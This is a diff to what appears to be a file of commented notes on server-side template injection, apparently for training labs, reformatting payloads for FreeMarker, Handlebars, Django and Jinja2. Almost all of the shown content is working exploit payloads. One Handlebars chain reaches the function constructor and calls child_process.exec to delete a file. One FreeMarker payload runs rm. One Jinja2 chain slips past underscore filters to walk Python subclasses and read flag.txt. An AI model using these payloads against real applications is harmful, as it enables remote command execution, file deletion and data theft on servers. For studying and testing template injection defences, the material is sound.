@@ -14,23 +14,22 @@
 // ${"freemarker.template.utility.Execute"?new()("rm  morale.txt")}
 //* handlebars
 // wrtz{{#with "s" as |string|}}
-    // {{#with "e"}}
-        // {{#with split as |conslist|}}
-            // {{this.pop}}
-            // {{this.push (lookup string.sub "constructor")}}
-            // {{this.pop}}
-            // {{#with string.split as |codelist|}}
-                // {{this.pop}}
-                // {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
-                // {{this.pop}}
-                // {{#each conslist}}
-                    // {{#with (string.sub.apply 0 codelist)}}
-                        // {{this}}
-                    // {{/with}}
-                // {{/each}}
-            // {{/with}}
-        // {{/with}}
-    // {{/with}}
+//   {{#with "e"}}
+//       {{#with split as |conslist|}}
+//           {{this.pop}}
+//           {{this.push (lookup string.sub "constructor")}}
+//           {{this.pop}}
+//           {{#with string.split as |codelist|}}
+//              {{this.pop}}
+//              {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+//               {{this.pop}}
+//               {{#each conslist}}
+//                   {{#with (string.sub.apply 0 codelist)}}
+//                      {{this}}
+//                  {{/with}}
+//               {{/each}}
+//          {{/with}}
+//       {{/with}}//  {{/with}}
 // {{/with}}
 //* django template engine
 // {% debug %}
@@ -55,7 +54,7 @@
 // {{ object|attr(attribute_name) }} <==> {{ object.attribute_name }}
 // for add _ to the name we can use ([request.args.filtered * 2 , "class" , request.args.filtered * 2] | join ) <==> __class__
 
-// we end up with this : 
+// we end up with this :
 // {{ ((''|attr([request.args.underscore * 2 , "class" , request.args.underscore * 2] | join) |
 // attr([request.args.underscore * 2 , "mro" , request.args.underscore * 2] | join))[2]
 // | attr([request.args.underscore * 2 , "subclasses" , request.args.underscore * 2] | join)())[40]('flag.txt).read()}}
